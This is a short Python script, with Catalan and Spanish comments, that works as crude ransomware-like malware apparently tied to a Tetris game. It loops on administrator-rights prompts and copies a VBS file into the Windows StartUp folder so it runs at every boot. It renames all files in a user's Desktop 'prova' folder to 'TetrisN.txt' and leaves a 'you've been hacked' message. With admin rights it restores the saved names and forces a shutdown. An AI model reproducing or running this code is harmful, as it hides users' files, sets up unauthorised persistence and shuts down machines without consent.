import os
import admin
def bucle():
    principi=os.getcwd()
    ad=1
    if not admin.isUserAdmin():
        try:
               admin.runAsAdmin()#preguntar moltes vegades
        except:
            ad=0

    os.chdir("C:/Users")
    for i in os.listdir():
            try:
                os.chdir(i + "/Desktop/prova")
            except:
                pass
    lloc=os.getcwd()
    os.chdir(principi)
    if ad==1:

        name="polla.vbs"
        directorio='"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"'
        os.system("copy " + " " + name + " " + directorio)
        if "NO_BORRAR" in os.listdir(lloc):
            os.chdir(lloc)
            archivo2 = open("NO_BORRAR", "r")
            num=archivo2.readlines()[1]
            archivo2.close()
            os.chdir(principi)
            archivo = open('coses'+str(num), 'r')
            lines = archivo.readlines()
            archivo.close()
            j = 0
            os.chdir(lloc)
            for i in lines:
                try:
                    os.rename("Tetris" + str(j) + ".txt", i[:-1])
                    j += 1
                except:
                    pass
            os.remove("NO_BORRAR")
            os.chdir(principi)
            os.remove('coses'+str(num))

        os.system("shutdown /p")#tancar quan moris en el joc
    else:
        if "NO_BORRAR" not in os.listdir(lloc):
            try:
                archivo3 = open("Informació", "r")
                num = archivo3.readlines()[0]
                archivo = open("coses"+str(num), "w")
                archivo.close()
                archivo = open("coses"+str(num), "a")
                j=0
                for i in os.listdir(lloc):
                    os.chdir(principi)
                    archivo.write(str(i)+"\n")
                    os.chdir(lloc)
                    os.rename(i, "Tetris"+str(j)+".txt")
                    j+=1
                archivo2 = open("NO_BORRAR", "w")
                archivo2.close()
                archivo2 = open("NO_BORRAR", "a")
                archivo2.write("Has sigut hackejat puto"+"\n"+num)
                os.chdir(principi)
                archivo3 = open("Informació", "w")
                archivo3.write(str(int(num)+1))
                #augmentar num
            except:
                os.chdir(principi)
                bucle()
        else:
            bucle()
            #print("pulsa que si")
bucle()
